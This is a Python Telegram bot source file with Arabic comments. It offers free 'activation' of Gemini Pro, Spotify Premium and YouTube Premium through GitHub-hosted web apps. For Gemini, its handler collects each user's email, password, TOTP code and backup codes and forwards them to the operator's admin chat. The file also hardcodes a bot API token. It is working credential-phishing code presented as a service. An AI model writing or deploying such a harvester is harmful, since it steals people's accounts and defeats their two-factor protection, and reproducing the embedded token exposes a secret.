import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
import json
import os
from flask import Flask, request
import sys

API_TOKEN = '8840162276:AAGP0Ypb-n5TW67SMLnL2ROD4mw_a5x2DrY'
ADMIN_ID = '8227136699'
RENDER_URL = 'https://mybot-1-d6wr.onrender.com'

# إضافة threaded=False لضمان استقرار عمل البوت مع السيرفر
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

# 1. مسار المراقبة: يزوره UptimeRobot كل 5 دقائق ليبقى مستيقظاً (لا يتدخل في الربط أبداً)
@app.route('/')
def index():
    return "السيرفر يعمل بنجاح ومستيقظ!", 200

# 2. مسار الربط: تزوره أنت مرة واحدة فقط لربط البوت
@app.route('/setup')
def setup_webhook():
    try:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_URL}/{API_TOKEN}", drop_pending_updates=True)
        return "تم ربط البوت بتيليجرام بنجاح تام وسيعمل الآن!", 200
    except Exception as e:
        return f"حدث خطأ أثناء الربط: {e}", 500

# 3. مسار الاستقبال: لاستقبال رسائل العملاء من تيليجرام
@app.route(f"/{API_TOKEN}", methods=['POST'])
def getMessage():
    try:
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return "OK", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(
        KeyboardButton("🤖 تفعيل Gemini Pro", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/gemini.html")),
        KeyboardButton("🎧 تفعيل Spotify Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/spotify.html")),
        KeyboardButton("▶️ تفعيل YouTube Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/youtube.html"))
    )
    bot.send_message(message.chat.id, "أهلاً بك!\nالرجاء اختيار الخدمة المطلوبة من القائمة بالأسفل 👇:", reply_markup=markup)

@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    chat_id = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
    try:
        data = json.loads(message.web_app_data.data)
        service = data.get('service', 'gemini')
        bot.send_message(chat_id, "طلبك قيد التنفيذ يرجى الانتظار")
        
        if service == "spotify":
            admin_msg = f"🎧 **طلب تفعيل Spotify**\n👤 العميل: {username}\n🔗 الرابط: `{data.get('link', 'غير متوفر')}`"
        elif service == "youtube":
            admin_msg = f"▶️ **طلب تفعيل YouTube**\n👤 العميل: {username}\n🔗 الرابط: `{data.get('link', 'غير متوفر')}`"
        else:
            admin_msg = f"🤖 **طلب تفعيل Gemini Pro**\n👤 العميل: {username}\n📧 الحساب: `{data.get('email', 'غير متوفر')}`\n🔑 الباسورد: `{data.get('password', 'غير متوفر')}`\n🔒 TOTP: `{data.get('totp', 'لا يوجد')}`\n🛡️ احتياطي: `{data.get('backup', 'لا يوجد')}`"

        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    except Exception as e:
        pass

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
